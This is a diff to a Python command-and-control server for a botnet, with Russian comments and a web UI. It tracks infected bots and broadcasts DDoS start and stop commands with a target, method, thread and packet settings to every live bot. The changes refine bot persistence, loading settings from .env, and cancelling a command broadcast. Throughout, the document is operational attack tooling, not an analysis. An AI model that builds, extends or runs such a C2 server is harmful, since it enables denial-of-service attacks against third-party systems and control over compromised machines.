@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# server.py — C2 + UI + HMAC на весь трафик. v2.19
+# usage: python3 server.py <c2_port> <ui_port>
+
 import base64
 import hashlib
 import hmac
@@ -11,6 +15,27 @@ import time
 import uuid
 from collections import OrderedDict
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+# ---- .env autoload ----
+def _load_dotenv(path=".env"):
+    if not os.path.exists(path):
+        return
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#") or "=" not in line:
+                    continue
+                k, v = line.split("=", 1)
+                k = k.strip()
+                v = v.strip().strip("'\"")
+                if k and k not in os.environ:
+                    os.environ[k] = v
+    except OSError:
+        pass
+
+_load_dotenv()
+# ----------------------
 
 UI_PASSWORD = os.environ.get("C2_UI_PASSWORD", "")
 UI_SECRET   = os.environ.get("C2_UI_SECRET", "")
@@ -55,7 +80,7 @@ DEAD_BOT_TTL = 300.0
 LAN_CACHE_TTL = 60.0
 ATTACK_GRACE_SEC = 5.0
 ORPHAN_GRACE_SEC = 30.0
-STATS_LOG_INTERVAL = 10.0  # сек между логами "Miku Miku Beam from ... to ..."
+STATS_LOG_INTERVAL = 10.0
 
 DDOS_LIMITS = {
     "threads_max": 64, "pktsize_max": 1400, "duration_max": 3600, "delay_ms_max": 10000,
@@ -69,10 +94,9 @@ lock = threading.Lock()
 send_lock = threading.Lock()
 attack_lock = threading.Lock()
 attack_gen = 0
-BOTS_FILE = "bots.json"
+BOTS_FILE = os.environ.get("C2_BOTS_FILE", "bots.json")
 _bots_dirty = False
 
-# nonce cache: {bid: OrderedDict(nonce -> ts)} — O(1) contains, TTL prune
 seen_frame_nonces = {}
 seen_hello_nonces = {}
 
@@ -84,7 +108,7 @@ ui_state = {
     "total_packets": 0, "last_pps_window": [], "bot_pps": {},
     "had_attack": False, "last_finished_reason": "",
     "attack_target": "", "attack_method": "",
-    "_last_stats_log": {},  # bid -> ts последнего "Miku Miku Beam from ... to ..."
+    "_last_stats_log": {},
 }
 ui_lock = threading.Lock()
 log_buf = []
@@ -110,7 +134,6 @@ class C2HTTPServer(ThreadingHTTPServer):
         super().finish()
 
 
-# ---------- Bot persistence ----------
 def _save_bots():
     global _bots_dirty
     with lock:
@@ -132,6 +155,7 @@ def _load_bots():
     try:
         with open(BOTS_FILE, "r") as f:
             data = json.load(f)
+        now = time.time()
         with lock:
             for e in data:
                 bid = e.get("id")
@@ -140,14 +164,13 @@ def _load_bots():
                     "sock": None, "ip": e.get("ip",""), "alive": False,
                     "host": e.get("host","?"), "os": e.get("os","?"),
                     "arch": e.get("arch","?"), "last_seen": e.get("last_seen",0),
-                    "seq": 0, "closed_at": 0,
+                    "seq": 0, "closed_at": now,  # <--- 2.4: теперь не удалится сразу
                 }
         print(f"[*] Loaded {len(data)} known bots from {BOTS_FILE}")
     except (OSError, json.JSONDecodeError):
         pass
 
 
-# ---------- HMAC ----------
 def _hmac_hex(b, key=None): return hmac.new(key or PSK, b, hashlib.sha256).hexdigest()
 
 def _payload_for_hash(typ, cmd, data):
@@ -172,7 +195,6 @@ def _nonce_ok(cache, bid, nonce, ts):
         dq = cache.get(bid)
         if dq is None:
             dq = OrderedDict(); cache[bid] = dq
-        # prune TTL с головы
         while dq:
             first_t = next(iter(dq.values()))
             if now - first_t < NONCE_TTL: break
@@ -247,12 +269,9 @@ def _lan_ips():
     return out
 
 def _escape_js(s):
-    """Экранирование для вставки в JS-строку внутри <script>.
-    НЕ использует html.escape — иначе ломает URL с &."""
     return json.dumps(s).replace("</", "<\\/")
 
 def _escape_html_text(s):
-    """Только для HTML-текста (не для JS, не для src)."""
     return html.escape(s, quote=True)
 
 
@@ -546,7 +565,6 @@ def _handle_ddos_stats(bid, data):
         ui_state["last_pps_window"].append((now, pps))
         if len(ui_state["last_pps_window"]) > 60: ui_state["last_pps_window"].pop(0)
         target = ui_state.get("attack_target","?")
-        # throttle лога "Miku Miku Beam from ... to ..."
         last_log = ui_state["_last_stats_log"].get(bid, 0)
         if delta > 0 and now - last_log >= STATS_LOG_INTERVAL:
             ui_state["_last_stats_log"][bid] = now
@@ -559,8 +577,6 @@ def _handle_ddos_stats(bid, data):
         ui_log(f"Miku Miku Beam from {ip} to {target}", "info")
 
 def _check_attack_finished(reason=None):
-    """Лёгкая проверка: НЕ берёт attack_lock. Порядок: lock -> ui_lock.
-    Чистка ORPHANED — после ui_lock, отдельным захватом lock."""
     with lock:
         now = time.time()
         active = False
@@ -580,7 +596,6 @@ def _check_attack_finished(reason=None):
             if reason: ui_state["last_finished_reason"] = reason
 
     if not active and was:
-        # чистка ORPHANED — отдельным захватом lock, без вложения в ui_lock
         with lock:
             for rec in in_flight.values():
                 if rec.get("kind") == "ddos_start" and rec["state"] == "ORPHANED":
@@ -670,9 +685,6 @@ def accept_loop(srv):
         threading.Thread(target=bot_reader, args=(bid, conn, ip, tail), daemon=True).start()
 
 def broadcast_cmd(cmd, kind=None, gen=None):
-    """Отправляет CMD всем живым ботам.
-    gen: если задан, перед КАЖДОЙ отправкой под send_lock проверяет, что attack_gen == gen.
-    Если attack_gen изменился — прекращает рассылку (отмена)."""
     if len(cmd) > CMD_MAX:
         ui_log(f"cmd too long ({len(cmd)}>{CMD_MAX}), truncating", "warn")
         cmd = cmd[:CMD_MAX]
@@ -686,13 +698,15 @@ def broadcast_cmd(cmd, kind=None, gen=None):
             targets.append((bid, b["sock"], b["seq"], cid))
     dead = []
     sent = 0
-    for bid, sock, seq, cid in targets:
-        if gen is not None:
+    # 2.5: O(1) отмена вместо O(n^2) targets.index
+    aborted = False
+    for i, (bid, sock, seq, cid) in enumerate(targets):
+        if gen is not None and not aborted:
             with attack_lock:
                 if attack_gen != gen:
-                    # отмена: помечаем неотправленные записи как LOST
+                    aborted = True
                     with lock:
-                        for b2, s2, q2, c2 in targets[targets.index((bid, sock, seq, cid)):]:
+                        for _, _, _, c2 in targets[i:]:
                             rec = in_flight.get(c2)
                             if rec and rec["state"] == "SENT":
                                 rec["state"] = "LOST"
@@ -712,6 +726,9 @@ def broadcast_cmd(cmd, kind=None, gen=None):
                 else:
                     rec["state"] = "LOST"
         _close_bot(bid, sock, "send failed")
+    # 2.2: возвращаем 0, если отменили
+    if aborted:
+        return 0
     return sent
 
 def list_bots():
@@ -802,7 +819,7 @@ def reaper():
 
 
 class UIHandler(BaseHTTPRequestHandler):
-    server_version = "C2UI/2.17"
+    server_version = "C2UI/2.19"
     def log_message(self, fmt, *args): pass
 
     def _json(self, obj, code=200):
@@ -890,7 +907,6 @@ class UIHandler(BaseHTTPRequestHandler):
 
     def _api_attack(self):
         global attack_gen
-        # attack_lock — только вокруг ui_state и attack_gen. broadcast_cmd — вне.
         with attack_lock:
             body = self._body_json()
             def _gi(k, d):
@@ -931,7 +947,6 @@ class UIHandler(BaseHTTPRequestHandler):
             ui_log(f"Miku Miku Beam from server to {target} ({method})", "ok")
             payload = json.dumps({"target":target,"method":method,"pktsize":pktsize,
                 "duration":duration,"delay_ms":delay_ms,"threads":threads}, separators=(",",":"))
-        # broadcast_cmd вне attack_lock; gen-проверка перед каждой отправкой
         n = broadcast_cmd("ddos_start " + payload, kind="ddos_start", gen=current_gen)
         if n == 0:
             with attack_lock:
@@ -948,7 +963,6 @@ class UIHandler(BaseHTTPRequestHandler):
         with attack_lock:
             attack_gen += 1
             my_gen = attack_gen
-        # Собираем cid ДО broadcast, чтобы wait_for_stop знал конкретные записи
         with lock:
             before_cids = set(in_flight.keys())
         n = broadcast_cmd("ddos_stop", kind="ddos_stop")
@@ -967,7 +981,6 @@ class UIHandler(BaseHTTPRequestHandler):
                     done = {c for c in pending
                             if in_flight.get(c, {}).get("state") in ("DONE","LOST","ORPHANED")}
                     pending -= done
-                # ORPHANED — бот не получил stop; логируем явно
                 with lock:
                     for c in pending:
                         r = in_flight.get(c)
@@ -982,11 +995,10 @@ class UIHandler(BaseHTTPRequestHandler):
                 if attack_gen != my_gen: return
                 ui_state["attack_running"] = False
                 ui_state["had_attack"] = False
+            ui_ws_broadcast({"type":"attack_stopped"})
             ui_ws_broadcast({"type":"finished"})
             ui_log("Атака остановлена", "ok")
         threading.Thread(target=wait_for_stop, daemon=True).start()
-        # attack_stopped — сразу после broadcast, но UI покажет «идёт остановка» до finished
-        ui_ws_broadcast({"type":"attack_stopped"})
         self._json({"ok": True, "bots": n})
 
     def _handle_ws(self):
@@ -1108,7 +1120,7 @@ h1{font-family:"Comic Sans MS","Chalkboard SE",cursive;font-size:42px;text-align
  <pre class="console" id="console"></pre>
  <div class="hint" id="lan-hint"></div>
 </div>
-<div class="footer"><span>♪ v2.17 ♪</span></div>
+<div class="footer"><span>♪ v2.19 ♪</span></div>
 </div>
 <div class="login" id="loginModal"><div class="login-box">
   <h3 style="margin:0 0 10px">UI Login</h3>
